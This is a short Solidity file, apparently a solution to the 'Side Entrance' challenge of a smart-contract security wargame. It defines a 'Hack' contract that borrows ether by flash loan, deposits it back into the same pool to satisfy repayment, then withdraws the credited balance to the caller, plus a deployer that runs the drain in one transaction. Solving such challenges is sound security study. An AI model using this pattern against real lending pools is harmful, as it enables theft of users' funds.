// License: SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.7;


import "contracts/side-entrance/SideEntranceLenderPool.sol";


contract Hack is IFlashLoanEtherReceiver {
    address private target;

    constructor(address _target) {
      target = _target;
    }

    function run(uint256 amount) external {
        SideEntranceLenderPool(target).flashLoan(amount);
        SideEntranceLenderPool(target).withdraw();
        payable(address(tx.origin)).transfer(amount);
    }

    function execute() external payable override {
        SideEntranceLenderPool(target).deposit{value: msg.value}();
    }


    receive() external payable { }
}


contract Deployer {
    constructor(address target, uint256 amount) {
        Hack h = new Hack(target);
        h.run(amount);
    }
}
